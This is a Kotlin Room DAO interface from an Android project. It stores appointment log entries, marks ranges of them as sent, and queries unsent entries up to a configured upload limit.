package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.AppointmentLog
import com.android.services.util.AppConstants

@Dao
interface AppointmentLogDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(appointments: List<AppointmentLog>)

    @Query("Update appointment_log set sentStatus = :updated_appointment where unique_id BETWEEN :startId AND :endId")
    fun updateAppiontment(updated_appointment: Int, startId: Int, endId: Int): Int

    @Query("Select * from appointment_log where sentStatus = :status order by unique_id ASC limit ${AppConstants.otherLogsUploadLimit}")
    fun selectAllAppiontment(status: Int): List<AppointmentLog>

    @Query("Select appointmentId from appointment_log where appointmentId=:id")
    fun checkIfAlreadyExist(id: String): String?
}